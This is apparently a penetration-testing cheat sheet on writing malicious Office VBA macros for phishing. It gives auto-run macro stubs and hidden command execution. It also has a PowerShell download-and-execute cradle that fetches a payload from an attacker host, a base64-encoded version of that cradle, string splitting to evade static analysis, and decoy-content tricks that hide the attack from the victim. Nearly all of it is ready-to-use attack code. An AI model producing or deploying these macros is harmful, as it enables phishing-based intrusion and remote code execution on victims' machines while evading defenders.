---
tags:
  - Code_Injection
  - Execution
  - Foundational
  - Windows
---

## VBA Macro Development
resources: [Microsoft VBA Reference](https://learn.microsoft.com/en-us/office/vba/api/overview/)

> [!info] Visual Basic for Applications (**VBA**) executes within Office applications. Primary vector for initial access via phishing.

### Auto-Execute Macros

#### AutoOpen (Word)
> [!tip] Executes when document is opened.

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    ' Payload here
End Sub
```

#### Auto_Open (Excel)
> [!tip] Executes when workbook is opened.

```vba
Sub Auto_Open()
    MyMacro
End Sub

Sub Workbook_Open()
    MyMacro
End Sub

Sub MyMacro()
    ' Payload here
End Sub
```

### Basic VBA Execution

#### Shell Command Execution
```vba
Sub MyMacro()
    Dim str As String
    str = "cmd.exe /c whoami > %TEMP%\output.txt"
    Shell str, vbHide
End Sub
```

#### WScript.Shell Execution
```vba
Sub MyMacro()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "calc.exe", 0, False
    Set wsh = Nothing
End Sub
```

### PowerShell from VBA

#### Basic PowerShell Execution
```vba
Sub MyMacro()
    Dim str As String
    str = "powershell -exec bypass -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/payload.ps1')"""
    Shell str, vbHide
End Sub
```

#### PowerShell with Encoded Command
```vba
Sub MyMacro()
    Dim str As String
    str = "powershell -exec bypass -nop -w hidden -enc <Base64EncodedCommand>"
    Shell str, vbHide
End Sub
```

### Generate Encoded PowerShell [Local]
```powershell
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
$encoded
```

### String Concatenation for Evasion

> [!tip] Break up suspicious strings to evade static analysis.

```vba
Sub MyMacro()
    Dim str As String
    str = "pow" & "ersh" & "ell -exec bypass -nop -c "
    str = str & Chr(34) & "IEX(New-Object Net.WebClient).Down"
    str = str & "loadString('http://<AttackerIP>/p.ps1')" & Chr(34)
    Shell str, vbHide
End Sub
```

## Phishing Pretexting

> [!important] Social engineering context increases macro execution likelihood.

### Document Switching Technique

> [!tip] Display decoy content after macro executes to maintain cover.

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    ' Execute payload
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell -exec bypass -nop -w hidden -enc <Payload>", 0, False

    ' Switch document content
    ActiveDocument.Content.Delete
    ActiveDocument.Content.InsertAfter "Thank you for your patience. The document failed to load. Please contact support."
End Sub
```

### Template Injection Pretext [alternative]

> [!tip] Create document that looks like it needs macros enabled for legitimate reason.

```vba
Sub AutoOpen()
    ' Hide "Enable Content" prompt by showing legitimate-looking content
    ActiveDocument.Shapes("DecoyImage").Visible = False
    ActiveDocument.Shapes("RealContent").Visible = True

    ' Execute payload in background
    MyMacro
End Sub
```
